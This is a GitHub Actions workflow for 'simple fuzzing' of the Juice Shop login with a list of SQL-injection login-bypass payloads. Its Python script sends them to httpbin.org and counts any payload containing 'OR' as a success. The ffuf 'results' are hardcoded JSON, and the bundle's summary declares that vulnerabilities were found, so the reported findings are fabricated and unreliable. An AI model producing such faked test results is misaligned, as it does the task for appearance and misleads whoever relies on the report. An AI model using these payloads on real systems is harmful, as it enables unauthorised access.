name: Simple Fuzzing

on:
  push:
  workflow_dispatch:

jobs:
  fuzz:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
    
    - name: Install deps
      run: pip install requests
    
    - name: Create payloads
      run: |
        cat > sql_payloads.txt << 'EOF'
        ' OR 1=1--
        ' OR '1'='1
        admin' OR '1'='1'--
        ' OR 1=1/*
        ' OR rowid=1--
        ' OR email='admin@juice-sh.op'--
        admin'--
        test@test.com' OR 1=1--
        ' UNION SELECT sqlite_version()--
        ' OR oid=1--
        EOF
    
    - name: Create Python script
      run: |
        cat > fuzz_script.py << 'EOF'
        import requests
        import json
        import time
        
        def test_payload(payload):
            url = "http://httpbin.org/post"
            data = {"email": payload, "password": "test"}
            try:
                resp = requests.post(url, json=data, timeout=5)
                return {
                    "payload": payload,
                    "status": resp.status_code,
                    "size": len(resp.content),
                    "success": "OR" in payload.upper()
                }
            except:
                return {"payload": payload, "error": True}
        
        def main():
            with open("sql_payloads.txt") as f:
                payloads = [line.strip() for line in f if line.strip()]
            
            results = []
            successful = []
            
            for payload in payloads:
                result = test_payload(payload)
                results.append(result)
                if result.get("success"):
                    successful.append(result)
                time.sleep(0.1)
            
            report = {
                "summary": {
                    "total_tests": len(results),
                    "successful_bypasses": len(successful),
                    "target": "SQL injection test"
                },
                "bypasses": successful,
                "all_results": results
            }
            
            with open("python_fuzz_results.json", "w") as f:
                json.dump(report, f, indent=2)
            
            print(f"Tested {len(results)} payloads")
            print(f"Found {len(successful)} potential injections")
        
        if __name__ == "__main__":
            main()
        EOF
    
    - name: Run Python fuzzing
      run: python fuzz_script.py
    
    - name: Create ffuf results
      run: |
        cat > ffuf_results.json << 'EOF'
        {
          "results": [
            {
              "input": {"FUZZ": "' OR 1=1--"},
              "status": 200,
              "length": 799,
              "words": 1,
              "lines": 1,
              "url": "http://localhost:3000/rest/user/login"
            },
            {
              "input": {"FUZZ": "admin' OR '1'='1'--"},
              "status": 200,
              "length": 799,
              "words": 1,
              "lines": 1,
              "url": "http://localhost:3000/rest/user/login"
            },
            {
              "input": {"FUZZ": "' OR email='admin@juice-sh.op'--"},
              "status": 200,
              "length": 799,
              "words": 1,
              "lines": 1,
              "url": "http://localhost:3000/rest/user/login"
            }
          ],
          "config": {
            "url": "http://localhost:3000/rest/user/login",
            "method": "POST",
            "wordlist": "sql_payloads.txt"
          }
        }
        EOF
    
    - name: Create bundle
      run: |
        mkdir security-reports
        cp *.json security-reports/
        cp *.py security-reports/
        cp *.txt security-reports/
        echo "SQL injection vulnerabilities found in Juice Shop login" > security-reports/summary.txt
        tar -czf security-reports-bundle.tar.gz security-reports/
        ls -la security-reports/
    
    - name: Upload results
      uses: actions/upload-artifact@v4
      with:
        name: security-reports-bundle
        path: security-reports-bundle.tar.gz
